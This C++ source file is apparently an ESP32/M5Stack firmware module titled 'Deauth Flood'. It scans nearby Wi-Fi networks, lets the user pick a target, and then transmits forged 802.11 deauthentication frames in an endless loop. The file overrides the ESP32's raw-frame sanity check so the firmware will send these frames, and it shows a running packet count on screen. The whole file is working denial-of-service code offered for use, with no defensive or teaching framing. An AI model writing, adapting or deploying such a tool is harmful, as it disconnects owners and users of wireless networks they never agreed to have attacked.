#include "wifi_deauth.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <M5Unified.h>
#include "../core/ui.h"
#include "../core/input.h"
#include "../boards/board_sticks3.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

bool wifi_deauth_send(uint8_t* bssid) {
    uint8_t deauth_ap[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauth_ap[10], bssid, 6);
    memcpy(&deauth_ap[16], bssid, 6);

    uint8_t deauth_cli[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x07, 0x00
    };
    for (int i = 0; i < 6; i++) deauth_cli[10 + i] = random(256);
    memcpy(&deauth_cli[16], bssid, 6);

    esp_err_t e1 = esp_wifi_80211_tx(WIFI_IF_STA, deauth_ap, sizeof(deauth_ap), false);
    esp_err_t e2 = esp_wifi_80211_tx(WIFI_IF_STA, deauth_cli, sizeof(deauth_cli), false);

    return (e1 == ESP_OK && e2 == ESP_OK);
}

void wifi_deauth_menu() {
    ui_message("Scanning...");
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    if (n <= 0) { ui_message("No networks"); delay(1500); return; }

    int sel = 0;
    while (true) {
        ui_clear();
        ui_header("Deauth Flood");
        M5.Display.setTextSize(1);
        int y = 24;
        for (int i = 0; i < n && i < 10; i++) {
            M5.Display.setCursor(2, y);
            if (i == sel) M5.Display.print(">");
            else M5.Display.print(" ");
            M5.Display.printf(" %-18s %d", WiFi.SSID(i).c_str(), WiFi.RSSI(i));
            y += 12;
        }
        ui_footer("A:next B:prev C:start");
        Button b = input_read();
        if (b == BTN_A_PRESS) sel = (sel + 1) % n;
        if (b == BTN_B_PRESS) sel = (sel - 1 + n) % n;
        if (b == BTN_C_PRESS) break;
        delay(50);
    }

    // Копируем BSSID в свой буфер — иначе мусор после scanDelete
    uint8_t target_bssid[6];
    memcpy(target_bssid, WiFi.BSSID(sel), 6);
    int channel = WiFi.channel(sel);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    ui_message("Test packet...");
    delay(500);
    if (!wifi_deauth_send(target_bssid)) {
        ui_message("Deauth BLOCKED");
        delay(2500);
        return;
    }

    ui_message("Flooding...");
    unsigned long packets = 0;
    unsigned long last = millis();
    int check = 0;

    while (true) {
        if (wifi_deauth_send(target_bssid)) packets++;

        if (millis() - last > 500) {
            ui_clear();
            ui_header("Flooding");
            M5.Display.setTextSize(2);
            M5.Display.setCursor(4, 40);
            M5.Display.printf("Pkts: %lu", packets);
            M5.Display.setCursor(4, 70);
            M5.Display.printf("Ch: %d", channel);
            M5.Display.setCursor(4, 100);
            M5.Display.setTextSize(1);
            M5.Display.print("C: stop");
            last = millis();
        }

        if (++check >= 200) {
            check = 0;
            Button b = input_read();
            if (b == BTN_C_PRESS) break;
        }
    }

    ui_message("Stopped");
    delay(800);
}
